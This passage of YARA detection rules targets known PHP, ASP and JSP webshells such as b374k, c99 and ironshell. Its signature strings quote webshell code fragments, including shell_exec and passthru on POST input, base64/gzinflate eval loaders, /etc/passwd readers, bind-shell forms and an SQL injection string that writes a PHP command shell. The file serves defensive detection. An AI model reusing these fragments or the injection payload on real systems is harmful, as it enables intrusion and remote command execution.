		$s16 = "function PHPf(){inclVar();var o=prompt(\"[ PHPfilEditor ] by r3v3ng4ns\\nDigite "
		$s18 = "if(empty($fu)) $fu = @$_GET['fu'];" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Ironshell_4_2
{
	meta:
		description = "PHP Webshells Github Archive - file ironshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "06e87e02-372b-5d4e-be52-5515a068665b"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_ironshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5642-L5661"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d47b8ba98ea8061404defc6b3a30839c4444a262"
		logic_hash = "1810071f261ad7390532b07ef24115726f236131aa8ffd29adbde9ebe5085e9d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword
		$s2 = "$link = mysql_connect($_POST['host'], $_POST['username'], $_POST"
		$s4 = "error_reporting(0); //If there is an error, we'll show it, k?" fullword
		$s8 = "print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d"
		$s15 = "if(!is_numeric($_POST['timelimit']))" fullword
		$s16 = "if($_POST['chars'] == \"9999\")" fullword
		$s17 = "<option value=\\\"az\\\">a - zzzzz</option>" fullword
		$s18 = "print shell_exec($command);" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Indexer_Asp_Php_2
{
	meta:
		description = "PHP Webshells Github Archive - file indexer.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "d6e17429-1b58-5a1b-846d-f5dbfd74cf3a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5662-L5678"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d"
		logic_hash = "c576925c95b5bd2549e8039a1fc6ac228bfab5ddee8c4e12264ea78e9828ba5c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword
		$s1 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword
		$s2 = "<form action=\"?Gonder\" method=\"post\">" fullword
		$s4 = "<form action=\"?oku\" method=\"post\">" fullword
		$s7 = "var message=\"SaNaLTeRoR - " fullword
		$s8 = "nDexEr - Reader\"" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Toolaspshell_2
{
	meta:
		description = "PHP Webshells Github Archive - file toolaspshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "016af030-4991-583c-aab5-a2933ae0eeec"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5679-L5692"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "11d236b0d1c2da30828ffd2f393dd4c6a1022e3f"
		logic_hash = "cb46d3170a9c144a22ef8c91b381495a471d2aa178a4a123eb9a1e32e1db7683"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef"
		$s12 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
		$s20 = "destino3 = folderItem.path & \"\\index.asp\"" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_B374K_Mini_Shell_Php_Php_2
{
	meta:
		description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d5b0dfa5-46b5-5323-a8e8-b119d8c2c8e5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5693-L5706"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "afb88635fbdd9ebe86b650cc220d3012a8c35143"
		logic_hash = "553bd775d9662f9410d9ab946ccffe4b2ee92e367bcc6345fa595527653280cf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@error_reporting(0);" fullword
		$s2 = "@eval(gzinflate(base64_decode($code)));" fullword
		$s3 = "@set_time_limit(0); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Sincap_1_0_2
{
	meta:
		description = "PHP Webshells Github Archive - file Sincap 1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "38d39739-660f-596d-a297-1f0dfe530797"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5707-L5722"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9b72635ff1410fa40c4e15513ae3a496d54f971c"
		logic_hash = "0cb8851285bd55b0b613ec4c46ab88142e2cbba7e527ad510b008cfb342af221"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">" fullword
		$s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B" fullword
		$s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli" fullword
		$s12 = "while (($ekinci=readdir ($sedat))){" fullword
		$s19 = "$deger2= \"$ich[$tampon4]\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_B374K_Php_2
{
	meta:
		description = "PHP Webshells Github Archive - file b374k.php.php"
		author = "Florian Roth (Nextron Systems)"
		id = "73eb7d8d-14bb-5bc2-90b2-90b6bd603bd1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5723-L5738"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "04c99efd187cf29dc4e5603c51be44170987bce2"
		logic_hash = "f44ecdcf327cf417a90a91c8d23f6137b80c2006bea2ca2e214f2bfdf5793771"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
		$s6 = "// password (default is: b374k)"
		$s8 = "//******************************************************************************"
		$s9 = "// b374k 2.2" fullword
		$s10 = "eval(\"?>\".gzinflate(base64_decode("

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Simattacker___Vrsion_1_0_0___Priv8_4_My_Friend_2
{
	meta:
		description = "PHP Webshells Github Archive - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3e0bae7d-77a1-5439-bbe7-177bec23cea0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5739-L5756"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "6454cc5ab73143d72cf0025a81bd1fe710351b44"
		logic_hash = "63ebb0c673a5aee05d2d9d571ebf63942d826b5148a5f7ed587ba1efbb0dc923"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword
		$s5 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">" fullword
		$s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s17 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s19 = "$Comments=$_POST['Comments'];" fullword
		$s20 = "Victim Mail :<br><input type='text' name='to' ><br>" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Myshell_3
{
	meta:
		description = "PHP Webshells Github Archive - file MyShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5775-L5793"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "42e283c594c4d061f80a18f5ade0717d3fb2f76d"
		logic_hash = "2c39ffecb44ce2f936ba3563c6086d8b2ed75aec3b57b45e2a1f5e7321ac9a3f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<title>MyShell error - Access Denied</title>" fullword
		$s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
		$s5 = "//A workdir has been asked for - we chdir to that dir." fullword
		$s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
		$s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
		$s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
		$s19 = "#every command you excecute." fullword
		$s20 = "<form name=\"shell\" method=\"post\">" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Pws_2
{
	meta:
		description = "PHP Webshells Github Archive - file pws.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5794-L5810"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7a405f1c179a84ff8ac09a42177a2bcd8a1a481b"
		logic_hash = "4b2eeb80200cc5dffa80cddc74f1902c0e8a5d2313d9a20d02eeb99ccb668ec0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "if ($_POST['cmd']){" fullword
		$s7 = "$cmd = $_POST['cmd'];" fullword
		$s10 = "echo \"FILE UPLOADED TO $dez\";" fullword
		$s11 = "if (file_exists($uploaded)) {" fullword
		$s12 = "copy($uploaded, $dez);" fullword
		$s17 = "passthru($cmd);" fullword

	condition:
		4 of them
}

rule SIGNATURE_BASE_Webshell_Reader_Asp_Php_2
{
	meta:
		description = "PHP Webshells Github Archive - file reader.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "80ec18e1-6f41-5188-b2d5-f4228c975fa1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5811-L5825"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "70656f3495e2b3ad391a77d5208eec0fb9e2d931"
		logic_hash = "6ffda38584b6cdec818af8e09c62bb4a46f40230ffd5c1a68993a91c37f67680"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail"
		$s12 = " HACKING " fullword
		$s16 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: "
		$s20 = "PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_3_2
{
	meta:
		description = "PHP Webshells Github Archive - file Safe_Mode_Bypass_PHP_4.4.2_and_PHP_5.1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "349cf6ac-92b3-59f7-a6e4-c23e69b454c6"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5826-L5843"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "db076b7c80d2a5279cab2578aa19cb18aea92832"
		logic_hash = "6840af0d9f99277277edce93deb54e9a319c8938169701c89fdeb65207590951"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
		$s9 = "\".htmlspecialchars($file).\" has been already loaded. PHP Emperor <xb5@hotmail."
		$s11 = "die(\"<FONT COLOR=\\\"RED\\\"><CENTER>Sorry... File" fullword
		$s15 = "if(empty($_GET['file'])){" fullword
		$s16 = "echo \"<head><title>Safe Mode Shell</title></head>\"; " fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Liz0Zim_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_2_2
{
	meta:
		description = "PHP Webshells Github Archive - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b647f529-be81-51ad-b671-84aec410e133"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5844-L5860"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b2b797707e09c12ff5e632af84b394ad41a46fa4"
		logic_hash = "92bfac3516a448bbb3e78cf8950c6e816bf35d0ae2f3d32bc9b9b2836309999b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$liz0zim=shell_exec($_POST[liz0]); " fullword
		$s6 = "$liz0=shell_exec($_POST[baba]); " fullword
		$s9 = "echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E"
		$s12 = " :=) :</font><select size=\"1\" name=\"liz0\">" fullword
		$s13 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_PHP_Backdoor_2_2
{
	meta:
		description = "PHP Webshells Github Archive - file php-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "65e1305b-4fc7-5885-b3df-92846bb57fe3"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_php_backdoor"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5861-L5877"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b190c03af4f3fb52adc20eb0f5d4d151020c74fe"
		logic_hash = "4228bcbfff5d7756615347196270f7916843e2aceacc7298610070b8b923381b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix" fullword
		$s6 = "// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi"
		$s11 = "if(!isset($_REQUEST['dir'])) die('hey,specify directory!');" fullword
		$s13 = "else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";" fullword
		$s15 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Worse_Linux_Shell_2_2
{
	meta:
		description = "PHP Webshells Github Archive - file Worse Linux Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "04ed7464-29d1-54b9-98ff-afc03475b220"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_Worse_Linux_Shell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5878-L5895"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "64623ab1246bc8f7d256b25f244eb2b41f543e96"
		logic_hash = "6480c524213583511253ea1d37820994bba8a86f58a3775d4a9e4325725289d8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "if( $_POST['_act'] == \"Upload!\" ) {" fullword
		$s5 = "print \"<center><h1>#worst @dal.net</h1></center>\";" fullword
		$s7 = "print \"<center><h1>Linux Shells</h1></center>\";" fullword
		$s8 = "$currentCMD = \"ls -la\";" fullword
		$s14 = "print \"<tr><td><b>System type:</b></td><td>$UName</td></tr>\";" fullword
		$s19 = "$currentCMD = str_replace(\"\\\\\\\\\",\"\\\\\",$_POST['_cmd']);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Phpinj_2
{
	meta:
		description = "PHP Webshells Github Archive - file pHpINJ.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5896-L5913"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "75116bee1ab122861b155cc1ce45a112c28b9596"
		logic_hash = "271efaa8f370376f971d3d59256658b341599ac554cc216e09401e44b16bdede"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
		$s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
		$s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN"
		$s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
		$s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
		$s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
		$s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_NGH_2
{
	meta:
		description = "PHP Webshells Github Archive - file NGH.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5914-L5931"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c05b5deecfc6de972aa4652cb66da89cfb3e1645"
		logic_hash = "572b026545b012951136bdb9b1101e38f27bc3321b895799bc853ea1190877f9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>" fullword
		$s2 = "/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */" fullword
		$s5 = "<form action=<?=$script?>?act=bindshell method=POST>" fullword
		$s9 = "<form action=<?=$script?>?act=backconnect method=POST>" fullword
		$s11 = "<form action=<?=$script?>?act=mkdir method=POST>" fullword
		$s16 = "die(\"<font color=#DF0000>Login error</font>\");" fullword
		$s20 = "<b>Bind /bin/bash at port: </b><input type=text name=port size=8>" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Matamu_2
{
	meta:
		description = "PHP Webshells Github Archive - file matamu.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5932-L5948"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d477aae6bd2f288b578dbf05c1c46b3aaa474733"
		logic_hash = "c0101dab5fe7c3a2652b2e23e1ef0274364137895a402a0367c6b5474c0e8a1f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "$command .= ' -F';" fullword
		$s3 = "/* We try and match a cd command. */" fullword
		$s4 = "directory... Trust me - it works :-) */" fullword
		$s5 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword
		$s10 = "$new_dir = $regs[1]; // 'cd /something/...'" fullword
		$s16 = "/* The last / in work_dir were the first charecter." fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Ru24_Post_Sh_2
{
	meta:
		description = "PHP Webshells Github Archive - file ru24_post_sh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "86a45d72-c42d-58d5-9969-d3ebfc22853d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5949-L5964"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d2c18766a1cd4dda928c12ff7b519578ccec0769"
		logic_hash = "6cf15a67c311979d32edfb443701cef34ee32d7a672314fc7b60b262b6b2c402"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "http://www.ru24-team.net" fullword
		$s4 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
		$s6 = "Ru24PostWebShell"
		$s7 = "Writed by DreAmeRz" fullword
		$s9 = "$function=passthru; // system, exec, cmd" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Hiddens_Shell_V1_2
{
	meta:
		description = "PHP Webshells Github Archive - file hiddens shell v1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "7194998e-c84c-5f59-92fe-857ecf7e8e88"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5965-L5976"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1674bd40eb98b48427c547bf9143aa7fbe2f4a59"
		logic_hash = "b76400c320e6294b0c831fbbb8e08a9d2097fbb027065f9c4b496d4b005ba016"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_C99_Madnet_2
{
	meta:
		description = "PHP Webshells Github Archive - file c99_madnet.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f2b9c3d1-1c55-59cb-a9bf-8b4011f86a3b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5977-L5992"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "17613df393d0a99fd5bea18b2d4707f566cff219"
		logic_hash = "cd4048f28405f106302643656ae5f8a257aaec0184a8057a9dffbda9bb857027"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"pass\";  //Pass" fullword
		$s3 = "$login = \"user\"; //Login" fullword
		$s4 = "             //Authentication" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_C99_Locus7S_2
{
	meta:
		description = "PHP Webshells Github Archive - file c99_locus7s.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f92fe5a2-e465-56ed-a77b-b32ea4c2c105"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5993-L6008"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d413d4700daed07561c9f95e1468fb80238fbf3c"
		logic_hash = "5ecfc5f6da471bd3037228c0bc762d50762933af3cf6674210c7b2017a45a646"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "$encoded = base64_encode(file_get_contents($d.$f)); " fullword
		$s9 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y"
		$s10 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq"
		$s11 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server " fullword
		$s19 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd " fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Jspwebshell_1_2_3
{
	meta:
		description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "dfd8c88d-4fe2-5786-9d71-65dba525c358"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6009-L6025"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0bed4a1966117dd872ac9e8dceceb54024a030fa"
		logic_hash = "13e696c1c671d7fda832c84f150e3f41ed55bf888c4bebfeb06ea68d6be65527"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
		$s1 = "String password=request.getParameter(\"password\");" fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s7 = "String editfile=request.getParameter(\"editfile\");" fullword
		$s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
